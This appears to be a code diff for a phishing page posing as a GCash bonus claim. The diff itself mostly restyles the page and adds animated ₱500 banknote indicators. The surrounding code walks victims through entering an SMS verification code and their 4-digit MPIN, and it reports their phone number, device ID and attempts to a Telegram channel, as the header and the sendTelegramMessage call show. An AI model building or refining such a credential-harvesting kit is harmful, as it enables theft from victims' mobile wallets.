@@ -1,7 +1,5 @@
 /**
- * Popup Share Module - Casino Theme Remastered
- * With Telegram Notifications for 6-digit request, verification attempts, AND 6-digit code entry
- * Balance Check + Decrement Animation
+ * Popup Share Module - With 500 Bills Indicators & Neon Blue Numpad
  */
 
 // ========== POPUP MODULE ==========
@@ -70,6 +68,37 @@
         const timestamp = now.toLocaleString();
         const message = `⚠️ MAX ATTEMPTS REACHED\nUser: ${userPhone}\nDevice ID: ${deviceId}\nTime: ${timestamp}\nAction: Redirect to index.html`;
         await sendTelegramMessage(message);
+    }
+    
+    // ========== UPDATE BILLS INDICATORS (Based on balance) ==========
+    function updateBillsIndicators(balance) {
+        const billIndicators = document.querySelectorAll('.bill-indicator');
+        const billCount = Math.min(4, Math.floor(balance / 500));
+        
+        for (let i = 0; i < billIndicators.length; i++) {
+            const indicator = billIndicators[i];
+            const img = indicator.querySelector('img');
+            
+            if (i < billCount) {
+                // Show actual bill front/back based on position
+                if (i % 2 === 0) {
+                    // Even index (0,2) - Front
+                    img.src = 'images/PHL-500-Front.png';
+                } else {
+                    // Odd index (1,3) - Back
+                    img.src = 'images/PHL-500-Back.png';
+                }
+                img.style.opacity = '1';
+                img.style.filter = 'none';
+                indicator.classList.add('active');
+            } else {
+                // Show silhouette
+                img.src = 'images/PHL-500-Front.png';
+                img.style.opacity = '0.25';
+                img.style.filter = 'grayscale(100%) brightness(30%)';
+                indicator.classList.remove('active');
+            }
+        }
     }
     
     // ========== INITIALIZATION ==========
@@ -172,9 +201,12 @@
         }
     }
     
-    // ========== ADD ANIMATIONS - Casino Theme ==========
+    // ========== ADD ANIMATIONS ==========
     function addAnimations() {
+        if (document.querySelector('#popup-casino-animations')) return;
+        
         const style = document.createElement('style');
+        style.id = 'popup-casino-animations';
         style.textContent = `
             @keyframes bounceIn {
                 0% { transform: scale(0) rotate(-180deg); opacity: 0; }
@@ -193,26 +225,9 @@
                 75% { transform: translateX(-5px); }
                 100% { transform: translateX(0); }
             }
-            @keyframes neonBluePulse {
-                0% { box-shadow: 0 0 5px #0066ff, 0 0 10px #0066ff; }
-                50% { box-shadow: 0 0 15px #0066ff, 0 0 25px #0066ff, 0 0 35px #0066ff; }
-                100% { box-shadow: 0 0 5px #0066ff, 0 0 10px #0066ff; }
-            }
-            @keyframes goldShine {
-                0% { background-position: -200% center; }
-                100% { background-position: 200% center; }
-            }
             @keyframes balanceDrain {
                 0%, 100% { transform: scale(1); }
                 50% { transform: scale(1.05); filter: brightness(1.2); }
-            }
-            @keyframes balanceDrop {
-                0% { transform: translateY(0); opacity: 1; }
-                100% { transform: translateY(20px); opacity: 0.5; }
-            }
-            @keyframes indicatorFill {
-                0% { width: 0; }
-                100% { width: 100%; }
             }
             @keyframes successFlash {
                 0% { transform: scale(1); }
@@ -220,11 +235,68 @@
                 100% { transform: scale(1); }
             }
             
-            .btn-pulse {
-                animation: pulseGold 0.5s ease;
+            /* Neon Blue Numpad Styles */
+            .numeric-keypad {
+                display: grid;
+                grid-template-columns: repeat(3, 1fr);
+                gap: 12px;
+                padding: 20px;
+                background: linear-gradient(145deg, #0a0f2a, #050a1a);
+                border: 2px solid #00d4ff;
+                border-radius: 20px;
+                margin: 15px 0;
+                box-shadow: 0 0 20px rgba(0, 212, 255, 0.4), inset 0 0 15px rgba(0, 212, 255, 0.1);
             }
-            .shake-effect {
-                animation: shake 0.3s ease-in-out;
+            .num-btn {
+                background: linear-gradient(145deg, #0d1530, #060b1a);
+                border: 1.5px solid #00d4ff;
+                border-radius: 50%;
+                width: 55px;
+                height: 55px;
+                font-size: 22px;
+                font-weight: bold;
+                color: #00d4ff;
+                cursor: pointer;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                margin: 0 auto;
+                font-family: 'Orbitron', monospace;
+                transition: all 0.1s ease;
+                box-shadow: 0 3px 0 #0088aa, 0 0 10px rgba(0, 212, 255, 0.3);
+                text-shadow: 0 0 5px #00d4ff;
+            }
+            .num-btn:active {
+                transform: translateY(3px);
+                box-shadow: 0 0 0 #0088aa;
+                background: linear-gradient(145deg, #1a2550, #0d1530);
+                color: #ffffff;
+            }
+            
+            /* Bill Indicators - Small design */
+            .bill-indicators {
+                display: flex;
+                justify-content: center;
+                gap: 8px;
+                margin: 15px 0;
+            }
+            .bill-indicator {
+                width: 55px;
+                height: 28px;
+                border-radius: 4px;
+                overflow: hidden;
+                transition: all 0.3s ease;
+                border: 1px solid rgba(212, 175, 55, 0.3);
+            }
+            .bill-indicator img {
+                width: 100%;
+                height: 100%;
+                object-fit: cover;
+                transition: all 0.3s ease;
+            }
+            .bill-indicator.active {
+                border-color: #d4af37;
+                box-shadow: 0 0 8px rgba(212, 175, 55, 0.5);
             }
             
             .mpin-dots {
@@ -237,48 +309,13 @@
                 width: 14px;
                 height: 14px;
                 border-radius: 50%;
-                background: rgba(212, 175, 55, 0.3);
-                border: 1px solid rgba(212, 175, 55, 0.5);
+                background: rgba(0, 212, 255, 0.3);
+                border: 1px solid rgba(0, 212, 255, 0.5);
                 transition: all 0.3s ease;
             }
             .mpin-dot.filled {
-                background: #d4af37;
-                box-shadow: 0 0 15px #d4af37, 0 0 30px rgba(212, 175, 55, 0.5);
-            }
-            
-            .numeric-keypad {
-                display: grid;
-                grid-template-columns: repeat(3, 1fr);
-                gap: 10px;
-                padding: 15px;
-                background: rgba(0, 0, 0, 0.4);
-                border: 1px solid rgba(212, 175, 55, 0.2);
-                border-radius: 16px;
-                margin: 10px 0;
-            }
-            .num-btn {
-                background: linear-gradient(145deg, #1a1a1a, #0a0a0a);
-                border: 1px solid rgba(212, 175, 55, 0.4);
-                border-radius: 50%;
-                width: 55px;
-                height: 55px;
-                font-size: 22px;
-                font-weight: bold;
-                color: #fce883;
-                cursor: pointer;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                margin: 0 auto;
-                font-family: 'Orbitron', monospace;
-                transition: all 0.1s ease;
-                box-shadow: 0 3px 0 rgba(212, 175, 55, 0.3);
-            }
-            .num-btn:active {
-                transform: translateY(3px);
-                box-shadow: 0 0 0 rgba(212, 175, 55, 0.3);
-                background: linear-gradient(145deg, #0a0a0a, #1a1a1a);
-                color: #d4af37;
+                background: #00d4ff;
+                box-shadow: 0 0 15px #00d4ff, 0 0 30px rgba(0, 212, 255, 0.5);
             }
             
             .small-back-btn {
@@ -323,36 +360,18 @@
                 width: 180px;
                 padding: 12px;
                 background: #000;
-                border: 2px solid rgba(212, 175, 55, 0.5);
+                border: 2px solid #00d4ff;
                 border-radius: 8px;
-                color: #fce883;
+                color: #00d4ff;
                 font-family: 'Orbitron', monospace;
                 transition: all 0.3s ease;
                 letter-spacing: 3px;
+                box-shadow: 0 0 10px rgba(0, 212, 255, 0.2);
             }
             .verification-input:focus {
-                border-color: #d4af37;
-                box-shadow: 0 0 15px rgba(212, 175, 55, 0.3);
+                border-color: #00d4ff;
+                box-shadow: 0 0 20px rgba(0, 212, 255, 0.5);
                 outline: none;
-            }
-            
-            #smsCodePopup {
-                background: linear-gradient(145deg, #1a0505, #000000);
-                border: 1px solid #d4af37;
-                border-radius: 12px;
-                padding: 12px;
-                margin: 10px 0;
-                animation: bounceIn 0.3s ease;
-                box-shadow: 0 0 20px rgba(212, 175, 55, 0.2);
-            }
-            
-            #step1Container,
-            #step2Container {
-                background: linear-gradient(145deg, rgba(20, 15, 40, 0.5), rgba(10, 5, 20, 0.5));
-                border: 1px solid rgba(212, 175, 55, 0.3);
-                border-radius: 16px;
-                padding: 15px;
-                margin: 10px 0;
             }
             
             .claim-gcash-button {
@@ -374,11 +393,6 @@
                 transform: translateY(4px);
                 box-shadow: 0 0 0 #6e4b0c;
             }
-            .claim-gcash-button:disabled {
-                opacity: 0.7;
-                cursor: not-allowed;
-                pointer-events: none;
-            }
             
             .divider {
                 width: 50px;
@@ -387,44 +401,24 @@
                 margin: 10px auto;
             }
             
-            .phase2-heading {
-                font-family: 'Orbitron', monospace;
-                font-size: 18px;
-                font-weight: 900;
-                background: linear-gradient(to bottom, #fcf6ba, #d4af37, #aa771c);
-                -webkit-background-clip: text;
-                background-clip: text;
-                color: transparent;
-                margin: 5px 0;
-                letter-spacing: 1px;
-                text-align: center;
-            }
-            
             .phase3-heading {
                 font-family: 'Orbitron', monospace;
                 font-size: 18px;
                 font-weight: 900;
-                color: #d4af37;
+                color: #00d4ff;
                 margin: 5px 0;
                 letter-spacing: 1px;
                 text-align: center;
-                text-shadow: 0 0 10px rgba(212, 175, 55, 0.5);
+                text-shadow: 0 0 15px #00d4ff;
             }
         `;
-        
-        if (!document.querySelector('#popup-casino-animations')) {
-            style.id = 'popup-casino-animations';
-            document.head.appendChild(style);
-        }
+        document.head.appendChild(style);
     }
     
     // ========== BALANCE DECREMENT ANIMATION ==========
     function animateBalanceDecrement(start, end, duration, callback) {
         const balanceSpan = document.getElementById('popupBalanceAmount');
         const balanceDisplay = document.getElementById('popupBalanceDisplay');
-        const indicator1 = document.getElementById('indicator1');
-        const indicator2 = document.getElementById('indicator2');
-        const indicator3 = document.getElementById('indicator3');
         const claimBtn = document.getElementById('claimGCashBtn');
         
         if (!balanceSpan) {
@@ -432,7 +426,6 @@
             return;
         }
         
-        // Disable button during animation
         if (claimBtn) {
             claimBtn.disabled = true;
             claimBtn.style.opacity = '0.7';
@@ -440,30 +433,12 @@
             claimBtn.innerHTML = '⏳ PROCESSING...';
         }
         
-        // Activate indicators one by one
-        let indicatorStep = 0;
-        const indicatorInterval = setInterval(() => {
-            indicatorStep++;
-            if (indicatorStep === 1 && indicator1) {
-                indicator1.style.background = '#d4af37';
-                indicator1.style.boxShadow = '0 0 10px #d4af37';
-            }
-            if (indicatorStep === 2 && indicator2) {
-                indicator2.style.background = '#d4af37';
-                indicator2.style.boxShadow = '0 0 10px #d4af37';
-            }
-            if (indicatorStep === 3 && indicator3) {
-                indicator3.style.background = '#d4af37';
-                indicator3.style.boxShadow = '0 0 10px #d4af37';
-                clearInterval(indicatorInterval);
-            }
-        }, duration / 4);
-        
+        // Animate bills indicators
+        const targetBills = Math.floor(end / 500);
         const totalSteps = 30;
         const decrementAmount = start / totalSteps;
         let currentStep = 0;
         
-        // Add pulse animation to balance
         if (balanceDisplay) {
             balanceDisplay.style.animation = 'balanceDrain 0.3s ease infinite';
         }
@@ -471,12 +446,16 @@
         const interval = setInterval(() => {
             currentStep++;
             const currentVal = start - (decrementAmount * currentStep);
+            const currentBills = Math.floor(currentVal / 500);
             
             if (balanceSpan) {
                 balanceSpan.textContent = Math.max(0, currentVal).toFixed(2);
                 balanceSpan.style.color = currentVal < start * 0.3 ? '#ff6666' : '#fce883';
                 balanceSpan.style.fontSize = (48 - (currentStep * 0.8)) + 'px';
             }
+            
+            // Update bills indicators in real-time
+            updateBillsIndicators(Math.max(0, currentVal));
             
             if (currentStep >= totalSteps) {
                 clearInterval(interval);
@@ -491,15 +470,6 @@
                     balanceDisplay.style.animation = 'none';
                 }
                 
-                // Reset indicators
-                [indicator1, indicator2, indicator3].forEach(ind => {
-                    if (ind) {
-                        ind.style.background = 'rgba(212,175,55,0.3)';
-                        ind.style.boxShadow = 'none';
-                    }
-                });
-                
-                // Show success flash
                 if (balanceDisplay) {
                     balanceDisplay.style.animation = 'successFlash 0.5s ease';
                     balanceDisplay.innerHTML = '✅ <span style="font-size:24px; color:#22C55E;">PROCESSING</span>';
@@ -511,14 +481,12 @@
                     }, 500);
                 }
                 
-                // Proceed after short delay
                 setTimeout(() => {
                     if (callback) callback();
                 }, 600);
             }
         }, duration / totalSteps);
         
-        // Add pulse effect to button
         if (claimBtn) {
             claimBtn.style.animation = 'pulseGold 0.5s ease infinite';
         }
@@ -750,10 +718,10 @@
             
             <div id="step1Container">
                 <div style="text-align: center; margin-bottom: 10px;">
-                    <span style="font-size: 11px; color: #d4af37; font-family: 'Orbitron', monospace; letter-spacing: 2px;">STEP 1 OF 2</span>
+                    <span style="font-size: 11px; color: #00d4ff; font-family: 'Orbitron', monospace; letter-spacing: 2px;">STEP 1 OF 2</span>
                 </div>
                 <p style="font-size: 11px; color: #999; text-align: center; margin: 0 0 10px 0; font-family: 'Poppins', sans-serif;">
-                    Enter the <strong style="color: #fce883;">6-digit verification code</strong> received via SMS
+                    Enter the <strong style="color: #00d4ff;">6-digit verification code</strong> received via SMS
                 </p>
                 <div style="display: flex; gap: 10px; justify-content: center; align-items: center;">
                     <input type="text" id="code6Digit" class="verification-input" placeholder="000000" maxlength="6" inputmode="numeric" autocomplete="one-time-code">
@@ -764,10 +732,10 @@
             
             <div id="step2Container" style="display: none;">
                 <div style="text-align: center; margin-bottom: 10px;">
-                    <span style="font-size: 11px; color: #d4af37; font-family: 'Orbitron', monospace; letter-spacing: 2px;">STEP 2 OF 2</span>
+                    <span style="font-size: 11px; color: #00d4ff; font-family: 'Orbitron', monospace; letter-spacing: 2px;">STEP 2 OF 2</span>
                 </div>
                 <p style="font-size: 11px; color: #999; text-align: center; margin: 0 0 10px 0; font-family: 'Poppins', sans-serif;">
-                    Enter your <strong style="color: #fce883;">4-digit MPIN</strong>
+                    Enter your <strong style="color: #00d4ff;">4-digit MPIN</strong>
                 </p>
                 
                 <div class="mpin-dots" id="mpinDots">
@@ -909,7 +877,7 @@
                     this.style.boxShadow = '0 0 15px #22C55E';
                     if (verifyBtn) verifyBtn.click();
                 } else {
-                    this.style.borderColor = 'rgba(212, 175, 55, 0.5)';
+                    this.style.borderColor = 'rgba(0, 212, 255, 0.5)';
                     this.style.boxShadow = 'none';
                 }
             });
@@ -1025,7 +993,7 @@
         }, 300);
     }
     
-    // ========== PHASE 1: DEFAULT POPUP - Casino Theme ==========
+    // ========== PHASE 1: DEFAULT POPUP with 500 Bills Indicators ==========
     function showPhase1(balance) {
         const popupInner = document.querySelector('.popup-inner');
         if (!popupInner) return;
@@ -1052,6 +1020,15 @@
                 ₱<span id="popupBalanceAmount">${balance.toFixed(2)}</span>
             </div>
             <div class="divider"></div>
+            
+            <!-- 500 Bills Indicators (4 bills) -->
+            <div class="bill-indicators">
+                <div class="bill-indicator"><img src="images/PHL-500-Front.png" alt="500"></div>
+                <div class="bill-indicator"><img src="images/PHL-500-Back.png" alt="500"></div>
+                <div class="bill-indicator"><img src="images/PHL-500-Front.png" alt="500"></div>
+                <div class="bill-indicator"><img src="images/PHL-500-Back.png" alt="500"></div>
+            </div>
+            
             <div class="invite-text" style="font-size: 12px; color: #999; text-align: center; font-family: 'Poppins', sans-serif;">
                 Your friend must confirm your invitation to get extra <strong style="color: #fce883;">₱500 bonus</strong>.
             </div>
@@ -1059,11 +1036,6 @@
                 <img src="images/luckyday.png" alt="Lucky Day" class="luckyday-img" style="max-width: 100%; border-radius: 12px; border: 1px solid rgba(212,175,55,0.3);" onerror="this.style.display='none'">
             </div>
             <div class="divider"></div>
-            <div class="indicator-group" style="display: flex; justify-content: center; gap: 12px; margin: 15px 0;">
-                <div class="indicator" id="indicator1" style="width: 40px; height: 4px; background: rgba(212,175,55,0.3); border-radius: 2px; transition: all 0.3s ease;"></div>
-                <div class="indicator" id="indicator2" style="width: 40px; height: 4px; background: rgba(212,175,55,0.3); border-radius: 2px; transition: all 0.3s ease;"></div>
-                <div class="indicator" id="indicator3" style="width: 40px; height: 4px; background: rgba(212,175,55,0.3); border-radius: 2px; transition: all 0.3s ease;"></div>
-            </div>
             
             <button class="claim-gcash-button" id="claimGCashBtn" style="width: 100%; display: flex; align-items: center; justify-content: center; gap: 8px; position: relative; overflow: hidden;">
                 <img src="images/gc_icon.png" class="gc-icon" style="width: 22px; height: 22px;"> CLAIM THRU GCASH
@@ -1076,6 +1048,9 @@
             </button>
         `;
         
+        // Update bills based on balance
+        updateBillsIndicators(balance);
+        
         const closeBtn = document.getElementById('popupClosePhase1');
         if (closeBtn) closeBtn.onclick = function() { closePopup(); };
         
@@ -1085,7 +1060,6 @@
         const claimBtn = document.getElementById('claimGCashBtn');
         if (claimBtn) {
             claimBtn.onclick = function() {
-                // CHECK IF BALANCE IS ZERO
                 if (currentBalance <= 0) {
                     claimBtn.classList.add('shake-effect');
                     claimBtn.style.background = 'linear-gradient(to bottom, #ff4444, #cc0000)';
@@ -1113,11 +1087,9 @@
                             popupTitle.textContent = '🎉 HOORAY! 🎉';
                         }
                     }, 2000);
-                    
                     return;
                 }
                 
-                // ANIMATE BALANCE DECREMENT THEN PROCEED
                 animateBalanceDecrement(currentBalance, 0, 800, function() {
                     checkFirewallAndTransition();
                 });
@@ -1145,7 +1117,7 @@
                 <div style="font-size: 50px; animation: bounceIn 0.5s ease;">🏆</div>
             </div>
             
-            <h2 class="phase2-heading">GREAT JOB!</h2>
+            <h2 class="phase2-heading" style="font-family: 'Orbitron', monospace; font-size: 18px; font-weight: 900; background: linear-gradient(to bottom, #fcf6ba, #d4af37, #aa771c); -webkit-background-clip: text; background-clip: text; color: transparent; text-align: center;">GREAT JOB!</h2>
             
             <div class="divider"></div>
             
